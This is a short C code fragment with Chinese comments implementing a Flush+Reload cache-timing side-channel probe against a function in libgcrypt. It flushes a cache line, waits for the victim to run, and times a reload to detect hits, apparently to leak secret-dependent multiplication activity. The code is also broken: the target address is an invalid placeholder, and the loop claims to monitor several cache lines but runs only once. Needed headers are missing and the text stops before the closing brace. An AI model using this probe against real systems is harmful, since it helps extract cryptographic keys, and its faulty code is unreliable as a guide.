#include <unistd.h>

// 假设目标函数地址（从libgcrypt.so获取）
volatile void *target_func = (void*)0x7f...;  // 示例

int flush_reload(void *addr) {
    _mm_clflush(addr);
    _mm_mfence();
    usleep(100);  // 等待受害者执行
    uint64_t start = __rdtsc();
    volatile char tmp = *(volatile char*)addr;
    uint64_t end = __rdtsc();
    return (end - start < 100) ? 1 : 0;
}

void monitor_multiplication() {
    // 监控多个缓存行（函数代码可能跨多行）
    for (int offset = 0; offset < 64; offset += 64) {
        int hit = flush_reload((char*)target_func + offset);
        if (hit) {
            printf("Cache hit at offset %d\n", offset);
        }
    }
